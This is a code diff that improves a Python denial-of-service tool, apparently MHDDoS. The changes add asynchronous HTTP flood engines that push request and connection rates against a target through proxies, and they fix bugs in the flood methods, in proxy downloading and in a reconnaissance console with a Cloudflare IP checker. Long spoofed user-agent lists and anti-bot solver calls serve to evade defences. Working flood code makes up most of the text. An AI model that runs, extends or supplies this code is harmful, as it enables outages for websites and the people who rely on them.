-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577',
-                'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931',
-                'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
-                'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
-                'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
-                'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
-                'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
-                'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
-            ]
+            useragents: List[str] = list(DEFAULT_USERAGENTS)
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
-        target.raw_path_qs, randchoice(['1.0', '1.1']))
+                                                     target.raw_path_qs,
+                                                     randchoice(['1.0', '1.1']))
         self._payload = (self._defaultpayload +
                          'Accept-Encoding: gzip, deflate, br\r\n'
                          'Accept-Language: en-US,en;q=0.9\r\n'
@@ -1097,6 +1043,7 @@ class HttpFlood(Thread):
                            "\r\n"))
 
     def open_connection(self, host=None) -> socket:
+        global CONNECTIONS_SENT           # [B18]
         if self._proxies:
             sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
         else:
@@ -1112,6 +1059,7 @@ class HttpFlood(Thread):
                                    server_side=False,
                                    do_handshake_on_connect=True,
                                    suppress_ragged_eofs=True)
+        CONNECTIONS_SENT += 1
         return sock
 
     @property
@@ -1127,15 +1075,15 @@ class HttpFlood(Thread):
             return "POST"
         if m in {"GSB", "HEAD"}:
             return "HEAD"
-        return "GET"          # trước đây trả "REQUESTS" - không phải method HTTP hợp lệ
+        return "GET"
 
     def POST(self) -> None:
         body = '{"data": %s}' % ProxyTools.Random.rand_str(32)
         payload: bytes = self.generate_payload(
             ("Content-Length: %d\r\n"
-                "X-Requested-With: XMLHttpRequest\r\n"
-                "Content-Type: application/json\r\n\r\n"
-                "%s") % (len(body), body))[:-2]
+             "X-Requested-With: XMLHttpRequest\r\n"
+             "Content-Type: application/json\r\n\r\n"
+             "%s") % (len(body), body))[:-2]
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -1160,9 +1108,9 @@ class HttpFlood(Thread):
         body = '{"data": %s}' % ProxyTools.Random.rand_str(512)
         payload: bytes = self.generate_payload(
             ("Content-Length: %d\r\n"
-                "X-Requested-With: XMLHttpRequest\r\n"
-                "Content-Type: application/json\r\n\r\n"
-                "%s") % (len(body), body))[:-2]
+             "X-Requested-With: XMLHttpRequest\r\n"
+             "Content-Type: application/json\r\n\r\n"
+             "%s") % (len(body), body))[:-2]
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -1199,13 +1147,13 @@ class HttpFlood(Thread):
                 "<params><param><value><string>%s</string></value>"
                 "</param><param><value><string>%s</string>"
                 "</value></param></params></methodCall>") % (
-                    ProxyTools.Random.rand_str(64),
-                    ProxyTools.Random.rand_str(64))
+            ProxyTools.Random.rand_str(64),
+            ProxyTools.Random.rand_str(64))
         payload: bytes = self.generate_payload(
             ("Content-Length: %d\r\n"
-                "X-Requested-With: XMLHttpRequest\r\n"
-                "Content-Type: application/xml\r\n\r\n"
-                "%s") % (len(body), body))[:-2]
+             "X-Requested-With: XMLHttpRequest\r\n"
+             "Content-Type: application/xml\r\n\r\n"
+             "%s") % (len(body), body))[:-2]
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -1308,7 +1256,8 @@ class HttpFlood(Thread):
             ts = time()
             for _ in range(self._rpc):
                 Tools.send(s, payload)
-                if time() > ts + 120: break
+                if time() > ts + 120:
+                    break
         Tools.safe_close(s)
 
     def AVB(self):
@@ -1326,25 +1275,23 @@ class HttpFlood(Thread):
             if self._proxies:
                 pro = randchoice(self._proxies)
                 with Tools.dgb_solver(self._target.human_repr(),
-                                        randchoice(self._useragents),
-                                        pro.asRequest()) as ss:
+                                      randchoice(self._useragents),
+                                      pro.asRequest()) as ss:
                     for _ in range(min(self._rpc, 5)):
                         sleep(min(self._rpc, 5) / 100)
                         with ss.get(self._target.human_repr(),
                                     proxies=pro.asRequest()) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
-                    Tools.safe_close(ss)
-                return                    # có proxy thì không chạy nhánh dưới nữa
+                return
 
             with Tools.dgb_solver(self._target.human_repr(),
-                                    randchoice(self._useragents)) as ss:
+                                  randchoice(self._useragents)) as ss:
                 for _ in range(min(self._rpc, 5)):
                     sleep(min(self._rpc, 5) / 100)
                     with ss.get(self._target.human_repr()) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
-                Tools.safe_close(ss)
 
     def DYN(self):
         payload: Any = str.encode(self._payload +
@@ -1399,21 +1346,21 @@ class HttpFlood(Thread):
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
-                                                           self._target.raw_path_qs,
-                                                           ProxyTools.Random.rand_str(6)) +
-                             "Host: %s\r\n" % self._target.authority +
-                             self.randHeadercontent +
-                             'Accept-Encoding: gzip, deflate, br\r\n'
-                             'Accept-Language: en-US,en;q=0.9\r\n'
-                             'Cache-Control: max-age=0\r\n'
-                             'Connection: Keep-Alive\r\n'
-                             'Sec-Fetch-Dest: document\r\n'
-                             'Sec-Fetch-Mode: navigate\r\n'
-                             'Sec-Fetch-Site: none\r\n'
-                             'Sec-Fetch-User: ?1\r\n'
-                             'Sec-Gpc: 1\r\n'
-                             'Pragma: no-cache\r\n'
-                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
+                                                                  self._target.raw_path_qs,
+                                                                  ProxyTools.Random.rand_str(6)) +
+                                     "Host: %s\r\n" % self._target.authority +
+                                     self.randHeadercontent +
+                                     'Accept-Encoding: gzip, deflate, br\r\n'
+                                     'Accept-Language: en-US,en;q=0.9\r\n'
+                                     'Cache-Control: max-age=0\r\n'
+                                     'Connection: Keep-Alive\r\n'
+                                     'Sec-Fetch-Dest: document\r\n'
+                                     'Sec-Fetch-Mode: navigate\r\n'
+                                     'Sec-Fetch-Site: none\r\n'
+                                     'Sec-Fetch-User: ?1\r\n'
+                                     'Sec-Gpc: 1\r\n'
+                                     'Pragma: no-cache\r\n'
+                                     'Upgrade-Insecure-Requests: 1\r\n\r\n')
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
@@ -1494,8 +1441,7 @@ class HttpFlood(Thread):
 
     def BOMB(self):
         if not self._proxies:
-            exit('This method requires proxies. '
-                    'Without proxies you can use github.com/codesenberg/bombardier')
+            return
 
         while True:
             proxy = randchoice(self._proxies)
@@ -1533,27 +1479,293 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
 
+# =====================================================================
+#  [B17][B18] ASYNC ENGINE
+# =====================================================================
+
+async def _async_open_connection(host: str, port: int, use_ssl: bool,
+                                 server_hostname: str = None, proxy=None):
+    """Mở 1 kết nối TCP/TLS bất đồng bộ.
+
+    - proxy=None           -> kết nối thẳng
+    - proxy HTTP + HTTPS   -> CONNECT rồi start_tls trên chính socket đó
+    - proxy HTTP + HTTP    -> trả socket thô (caller tự dùng absolute-URI)
+    - proxy SOCKS4/5       -> chưa hỗ trợ handshake async (báo OSError)
+    """
+    kwargs = {"ssl": ctx} if use_ssl else {}
+    if use_ssl:
+        kwargs["server_hostname"] = server_hostname
+
+    if proxy is None:
+        return await asyncio.open_connection(host, port, **kwargs)
+
+    if proxy.type in (ProxyType.SOCKS4, ProxyType.SOCKS5):
+        raise OSError("async chưa hỗ trợ SOCKS handshake, hãy dùng proxy HTTP")
+
+    r, w = await asyncio.open_connection(proxy.host, proxy.port)
+    try:
+        if use_ssl:
+            w.write(f"CONNECT {host}:{port} HTTP/1.1\r\n"
+                    f"Host: {host}:{port}\r\n\r\n".encode())
+            await w.drain()
+            head = await asyncio.wait_for(r.readuntil(b"\r\n\r\n"), timeout=10)
+            if b" 200 " not in head.split(b"\r\n", 1)[0]:
+                raise OSError("proxy CONNECT thất bại")
+            await w.start_tls(ctx, server_hostname=server_hostname)
+        return r, w
+    except Exception:
+        with suppress(Exception):
+            w.close()
+        raise
+
+
+class AsyncHttpFlood(Thread):
+    """[B16] Bản asyncio giữ kết nối keep-alive.
+
+    1 thread chứa 1 event loop, `workers` coroutine (CLI: threads), mỗi
+    coroutine giữ 1 kết nối và gửi `rpc` request trước khi mở lại.
+    """
+
+    _proxies: List[Proxy] = None
+    POLL = 0.05
+
+    def __init__(self,
+                 target: URL,
+                 workers: int = 100,
+                 rpc: int = 100,
+                 synevent: Event = None,
+                 useragents: Set[str] = None,
+                 referers: Set[str] = None,
+                 proxies: Set[Proxy] = None) -> None:
+        Thread.__init__(self, daemon=True)
+        self._target = target
+        self._workers = max(1, workers)
+        self._rpc = max(1, rpc)
+        self._synevent = synevent
+        self._useragents = list(useragents) if useragents else list(DEFAULT_USERAGENTS)
+        self._referers = list(referers) if referers else list(DEFAULT_REFERERS)
+        self._proxies = list(proxies) if proxies else None
+        self._payload_cache: List[bytes] = []
+
+        self._scheme = (target.scheme or "http").lower()
+        self._ssl = self._scheme == "https"
+        self._port = target.port or (443 if self._ssl else 80)
+        self._host = target.raw_host
+        self._path = target.raw_path_qs or "/"
+
+        for _ in range(8):
+            self._payload_cache.append(self._build_payload())
+
+    def _build_payload(self) -> bytes:
+        return (
+            f"GET {self._path} HTTP/1.1\r\n"
+            f"Host: {self._target.raw_authority}\r\n"
+            f"User-Agent: {randchoice(self._useragents)}\r\n"
+            f"Referer: {randchoice(self._referers)}\r\n"
+            "Accept: */*\r\n"
+            "Accept-Encoding: gzip, deflate, br\r\n"
+            "Accept-Language: en-US,en;q=0.9\r\n"
+            "Connection: keep-alive\r\n"
+            "\r\n"
+        ).encode()
+
+    # ---------------- asyncio core ----------------
+    async def _open(self, proxy=None):
+        """[B17] Nhận `proxy` từ caller (trước đây signature thiếu -> TypeError)."""
+        if proxy is None and self._proxies:
+            proxy = randchoice(self._proxies)
+        return await _async_open_connection(self._host, self._port, self._ssl,
+                                            self._target.raw_host, proxy)
+
+    async def _flooder(self) -> None:
+        global REQUESTS_SENT, BYTES_SEND     # [B19] thiếu global -> UnboundLocalError bị nuốt, PPS/BPS = 0
+        while self._synevent.is_set():
+            proxy = randchoice(self._proxies) if self._proxies else None
+            try:
+                r, w = await asyncio.wait_for(self._open(proxy), timeout=10)
+            except (asyncio.TimeoutError, OSError, Exception):
+                await asyncio.sleep(self.POLL)
+                continue
+            try:
+                absolute = proxy is not None and not self._ssl
+                for _ in range(self._rpc):
+                    if not self._synevent.is_set():
+                        break
+                    payload = self._payload_cache[randint(0, len(self._payload_cache) - 1)]
+                    if absolute:
+                        payload = payload.replace(
+                            f"GET {self._path} HTTP/1.1".encode(),
+                            f"GET {self._target.human_repr()} HTTP/1.1".encode(), 1)
+                    w.write(payload)
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += len(payload)
+                    await w.drain()
+            except Exception:
+                pass
+            finally:
+                with suppress(Exception):
+                    w.close()
+                    await asyncio.wait_for(w.wait_closed(), timeout=2)
+
+    async def _runner(self) -> None:
+        if not self._synevent.is_set():
+            await asyncio.get_running_loop().run_in_executor(None, self._synevent.wait)
+        tasks = [asyncio.create_task(self._flooder()) for _ in range(self._workers)]
+        try:
+            while self._synevent.is_set():
+                await asyncio.sleep(0.5)
+        finally:
+            for t in tasks:
+                t.cancel()
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    def run(self) -> None:
+        if self._synevent is None:
+            self._synevent = Event()
+            self._synevent.set()
+        try:
+            asyncio.run(self._runner())
+        except (KeyboardInterrupt, SystemExit):
+            pass
+        except Exception as e:                            # pragma: no cover
+            logger.debug(f"[AIOHTTP] stopped: {e.__repr__()}")
+
+
+class AsyncCpsFlood(Thread):
+    """[B18] Tích hợp NGUYÊN logic đoạn script asyncio rời:
+
+        async def flooder(target, payload, event, rpc=100):
+            await event.wait()
+            while event.is_set():
+                r, w = await open_connection(target.host, target.port or 80, ...)
+                for _ in range(rpc):
+                    w.write(payload); await w.drain(); pps += 1
+
+    Khác AsyncHttpFlood (giữ 1 kết nối, gửi rpc request):
+    bản này MỞ KẾT NỐI MỚI mỗi vòng lặp -> đẩy CPS (connection/giây) lên cao,
+    phù hợp test connection-rate. `workers` = số task coroutine,
+    `rpc` = số request gửi trên mỗi kết nối trước khi đóng.
+
+    CLI tương ứng script gốc:
+        python3 start.py ASYNCIO <url> 0 <workers> none.txt <rpc> <timer>
+    """
+
+    POLL = 0.01
+
+    def __init__(self,
+                 target: URL,
+                 workers: int = 100,
+                 rpc: int = 100,
+                 synevent: Event = None,
+                 proxies: Set[Proxy] = None) -> None:
+        Thread.__init__(self, daemon=True)
+        self._target = target
+        self._workers = max(1, workers)
+        self._rpc = max(1, rpc)
+        self._synevent = synevent
+        self._proxies = list(proxies) if proxies else None
+
+        self._ssl = (target.scheme or "http").lower() == "https"
+        self._port = target.port or (443 if self._ssl else 80)
+        self._host = target.raw_host
+
+        # payload giống hệt script gốc
+        self._payload = (
+            f"GET {target.raw_path_qs} HTTP/1.1\r\n"
+            f"Host: {target.raw_authority}\r\n"
+            "Connection: keep-alive\r\n"
+            "\r\n").encode()
+        # biến thể absolute-URI cho proxy HTTP + HTTP thường
+        self._payload_abs = self._payload.replace(
+            f"GET {target.raw_path_qs} HTTP/1.1".encode(),
+            f"GET {target.human_repr()} HTTP/1.1".encode(), 1)
+
+    async def flooder(self) -> None:
+        """Tương đương hàm flooder() trong script gốc."""
+        global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT   # [B19] thiếu global -> UnboundLocalError bị nuốt, không gửi được request nào
+        while not self._synevent.is_set():          # ~ await event.wait()
+            await asyncio.sleep(self.POLL)
+
+        while self._synevent.is_set():
+            proxy = randchoice(self._proxies) if self._proxies else None
+            w = None
+            try:
+                r, w = await asyncio.wait_for(
+                    _async_open_connection(self._host, self._port, self._ssl,
+                                           self._target.raw_host, proxy),
+                    timeout=10)
+                CONNECTIONS_SENT += 1
+                payload = self._payload_abs if (proxy is not None and not self._ssl) \
+                    else self._payload
+                for _ in range(self._rpc):
+                    if not self._synevent.is_set():
+                        break
+                    w.write(payload)
+                    await w.drain()
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += len(payload)
+            except asyncio.CancelledError:
+                raise
+            except Exception:
+                await asyncio.sleep(self.POLL)       # tránh busy-spin khi lỗi
+            finally:
+                if w is not None:
+                    with suppress(Exception):
+                        w.close()
+                    with suppress(Exception, asyncio.CancelledError):
+                        await asyncio.wait_for(w.wait_closed(), timeout=2)
+
+    async def _runner(self) -> None:
+        tasks = [asyncio.create_task(self.flooder()) for _ in range(self._workers)]
+        try:
+            while self._synevent.is_set():
+                await asyncio.sleep(0.5)
+        finally:
+            for t in tasks:
+                t.cancel()
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    def run(self) -> None:
+        if self._synevent is None:
+            self._synevent = Event()
+            self._synevent.set()
+        try:
+            asyncio.run(self._runner())
+        except (KeyboardInterrupt, SystemExit):
+            pass
+        except Exception as e:                            # pragma: no cover
+            logger.debug(f"[ASYNCIO] stopped: {e.__repr__()}")
+
+
 class ProxyManager:
 
     @staticmethod
     def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
-        providrs = [
-            provider for provider in cf["proxy-providers"]
-            if provider["type"] == Proxy_type or Proxy_type == 0
-        ]
+        # [B20] provider["type"] trong config.json là CHUỖI ("SOCKS5"/"HTTP"...)
+        # -> so sánh trực tiếp với int luôn sai, phải quy đổi qua stringToProxyType.
+        want = {1: ProxyType.HTTP, 4: ProxyType.SOCKS4,
+                5: ProxyType.SOCKS5}.get(Proxy_type)
+
+        selected = []
+        for provider in cf["proxy-providers"]:
+            ptype = ProxyType.stringToProxyType(str(provider.get("type", "http")))
+            if ptype == ProxyType.HTTPS:      # proxy "https" thực chất là HTTP
+                ptype = ProxyType.HTTP
+            if want is None or ptype == want:
+                selected.append((provider, ptype))
+
         logger.info(
-            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
-                providrs))
+            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}"
+            % len(selected))
         proxes: Set[Proxy] = set()
 
-        with ThreadPoolExecutor(max(1, len(providrs))) as executor:
-            future_to_download = {
-                executor.submit(
-                    ProxyManager.download, provider,
-                    ProxyType.stringToProxyType(str(provider["type"])))
-                for provider in providrs
-            }
-            for future in as_completed(future_to_download):
+        if not selected:
+            return proxes
+
+        with ThreadPoolExecutor(max(1, len(selected))) as executor:
+            futures = [executor.submit(ProxyManager.download, provider, ptype)
+                        for provider, ptype in selected]
+            for future in as_completed(futures):
                 for pro in future.result():
                     proxes.add(pro)
         return proxes
@@ -1579,10 +1791,73 @@ class ProxyManager:
 class ToolsConsole:
     METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}
 
+    CF_RANGES: Tuple[Tuple[str, int], ...] = (
+        ("173.245.48.0", 20), ("103.21.244.0", 22), ("103.22.200.0", 22),
+        ("103.31.4.0", 22), ("141.101.64.0", 18), ("108.162.192.0", 18),
+        ("190.93.240.0", 20), ("188.114.96.0", 20), ("197.234.240.0", 22),
+        ("198.41.128.0", 17), ("162.158.0.0", 15), ("104.16.0.0", 13),
+        ("104.24.0.0", 14), ("172.64.0.0", 13), ("131.0.72.0", 22),
+    )
+
     @staticmethod
-    def checkRawSocket():
+    def checkRawSocket() -> bool:
         with suppress(OSError):
             with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
+                return True
+        return False
+
+    @staticmethod
+    def _prompt_target(cons: str, label: str = "give-me-ipaddress#"):
+        try:
+            raw = input(f'{cons}{label} ').strip()
+        except EOFError:
+            return None, "exit"
+        if not raw:
+            return None, "empty"
+        up = raw.upper()
+        if up == "BACK":
+            return None, "back"
+        if up == "CLEAR":
+            return None, "clear"
+        if {up} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
+            return None, "exit"
+        return raw, "ok"
+
+    @staticmethod
+    def _clean_domain(domain: str) -> str:
+        d = domain.replace('https://', '').replace('http://', '')
+        if "/" in d:
+            d = d.split("/")[0]
+        if ":" in d:
+            d = d.split(":")[0]
+        return d.strip()
+
+    @staticmethod
+    def _ip2int(ip: str):
+        parts = ip.split(".")
+        if len(parts) != 4:
+            return None
+        n = 0
+        for p in parts:
+            if not p.isdigit():
+                return None
+            v = int(p)
+            if v > 255:
+                return None
+            n = (n << 8) | v
+        return n
+
+    @classmethod
+    def _is_cloudflare(cls, ip: str) -> bool:
+        n = cls._ip2int(ip)
+        if n is None:
+            return False
+        for base, bits in cls.CF_RANGES:
+            b = cls._ip2int(base)
+            if b is None:
+                continue
+            mask = (0xFFFFFFFF << (32 - bits)) & 0xFFFFFFFF
+            if (n & mask) == (b & mask):
                 return True
         return False
 
@@ -1591,19 +1866,23 @@ class ToolsConsole:
         cons = f"{gethostname()}@MHTools:~#"
 
         while 1:
-            cmd = input(cons + " ").strip()
-            if not cmd: continue
+            try:
+                cmd = input(cons + " ").strip()
+            except EOFError:
+                exit()
+            if not cmd:
+                continue
             if " " in cmd:
                 cmd, args = cmd.split(" ", 1)
 
             cmd = cmd.upper()
             if cmd == "HELP":
-                print("Tools:" + ", ".join(ToolsConsole.METHODS))
+                print("Tools:" + ", ".join(sorted(ToolsConsole.METHODS)))
                 print("Commands: HELP, CLEAR, BACK, EXIT")
                 continue
 
             if {cmd} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
-                exit(-1)
+                exit()
 
             if cmd == "CLEAR":
                 print("\033c")
@@ -1640,43 +1919,102 @@ class ToolsConsole:
                              Tools.humanformat(t[2]), Tools.humanformat(t[3]),
                              t[4], t[5], t[6], t[7], str(cpu_percent()) + "%",
                              str(virtual_memory().percent) + "%"))
-            if cmd in ["CFIP", "DNS"]:
-                print("Soon")
+                continue
+
+            if cmd == "CFIP":
+                while True:
+                    domain, act = ToolsConsole._prompt_target(cons)
+                    if act == "empty":
+                        continue
+                    if act == "back":
+                        break
+                    if act == "clear":
+                        print("\033c")
+                        continue
+                    if act == "exit":
+                        exit()
+
+                    domain = ToolsConsole._clean_domain(domain)
+                    print('please wait ...', end="\r")
+                    try:
+                        ips = [str(a) for a in resolver.resolve(domain, "A")]
+                    except Exception as e:
+                        logger.error(f"DNS error: {e.__str__() or e.__repr__()}")
+                        continue
+
+                    if not ips:
+                        logger.info("Không tìm thấy bản ghi A nào.")
+                        continue
+
+                    for ip in ips:
+                        logger.info(
+                            f"{ip:<16} -> "
+                            + (f"{bcolors.OKGREEN}CLOUDFLARE{bcolors.RESET}"
+                               if ToolsConsole._is_cloudflare(ip)
+                               else "không phải Cloudflare"))
+                    logger.info(f"Đã kiểm tra {len(ips)} IP của {domain}")
+                continue
+
+            if cmd == "DNS":
+                while True:
+                    domain, act = ToolsConsole._prompt_target(cons)
+                    if act == "empty":
+                        continue
+                    if act == "back":
+                        break
+                    if act == "clear":
+                        print("\033c")
+                        continue
+                    if act == "exit":
+                        exit()
+
+                    domain = ToolsConsole._clean_domain(domain)
+                    print('please wait ...', end="\r")
+                    for rtype in ("A", "AAAA", "CNAME", "MX", "NS", "TXT"):
+                        try:
+                            vals = [str(r) for r in resolver.resolve(domain, rtype)]
+                        except Exception:
+                            vals = []
+                        logger.info(f"{rtype:<6}: {', '.join(vals) if vals else '-'}")
                 continue
 
             if cmd == "CHECK":
                 while True:
-                    with suppress(Exception):
-                        domain = input(f'{cons}give-me-ipaddress# ')
-                        if not domain: continue
-                        if domain.upper() == "BACK": break
-                        if domain.upper() == "CLEAR":
-                            print("\033c")
-                            continue
-                        if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
-                            exit(-1)
-                        if "/" not in domain: continue
-                        logger.info("please wait ...")
+                    domain, act = ToolsConsole._prompt_target(cons)
+                    if act == "empty":
+                        continue
+                    if act == "back":
+                        break
+                    if act == "clear":
+                        print("\033c")
+                        continue
+                    if act == "exit":
+                        exit()
 
-                        with get(domain, timeout=20) as r:
+                    url = domain if domain.lower().startswith("http") else "http://" + domain
+                    logger.info("please wait ...")
+                    with suppress(Exception):
+                        with get(url, timeout=20) as r:
                             logger.info(('status_code: %d\n'
                                          'status: %s') %
                                         (r.status_code, "ONLINE"
-                                        if r.status_code <= 500 else "OFFLINE"))
+                                         if r.status_code <= 500 else "OFFLINE"))
+                continue
 
             if cmd == "INFO":
                 while True:
-                    domain = input(f'{cons}give-me-ipaddress# ')
-                    if not domain: continue
-                    if domain.upper() == "BACK": break
-                    if domain.upper() == "CLEAR":
+                    domain, act = ToolsConsole._prompt_target(cons)
+                    if act == "empty":
+                        continue
+                    if act == "back":
+                        break
+                    if act == "clear":
                         print("\033c")
                         continue
-                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
-                        exit(-1)
-                    domain = domain.replace('https://',
-                                            '').replace('http://', '')
-                    if "/" in domain: domain = domain.split("/")[0]
+                    if act == "exit":
+                        exit()
+
+                    domain = ToolsConsole._clean_domain(domain)
                     print('please wait ...', end="\r")
 
                     info = ToolsConsole.info(domain)
@@ -1692,39 +2030,43 @@ class ToolsConsole:
                                  "Region: %s\n") %
                                 (info["country"], info["city"], info["org"],
                                  info["isp"], info["region"]))
+                continue
 
             if cmd == "TSSRV":
                 while True:
-                    domain = input(f'{cons}give-me-domain# ')
-                    if not domain: continue
-                    if domain.upper() == "BACK": break
-                    if domain.upper() == "CLEAR":
+                    domain, act = ToolsConsole._prompt_target(cons, "give-me-domain#")
+                    if act == "empty":
+                        continue
+                    if act == "back":
+                        break
+                    if act == "clear":
                         print("\033c")
                         continue
-                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
-                        exit(-1)
-                    domain = domain.replace('https://',
-                                            '').replace('http://', '')
-                    if "/" in domain: domain = domain.split("/")[0]
+                    if act == "exit":
+                        exit()
+
+                    domain = ToolsConsole._clean_domain(domain)
                     print('please wait ...', end="\r")
 
                     info = ToolsConsole.ts_srv(domain)
                     logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
                     logger.info(f"UDP: {(info['_ts3._udp.'])}\n")
+                continue
 
             if cmd == "PING":
                 while True:
-                    domain = input(f'{cons}give-me-ipaddress# ')
-                    if not domain: continue
-                    if domain.upper() == "BACK": break
-                    if domain.upper() == "CLEAR":
+                    domain, act = ToolsConsole._prompt_target(cons)
+                    if act == "empty":
+                        continue
+                    if act == "back":
+                        break
+                    if act == "clear":
                         print("\033c")
-                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
-                        exit(-1)
+                        continue
+                    if act == "exit":
+                        exit()
 
-                    domain = domain.replace('https://',
-                                            '').replace('http://', '')
-                    if "/" in domain: domain = domain.split("/")[0]
+                    domain = ToolsConsole._clean_domain(domain)
 
                     logger.info("please wait ...")
                     r = ping(domain, count=5, interval=0.2)
@@ -1735,6 +2077,7 @@ class ToolsConsole:
                                 (r.address, r.avg_rtt, r.packets_received,
                                  r.packets_sent,
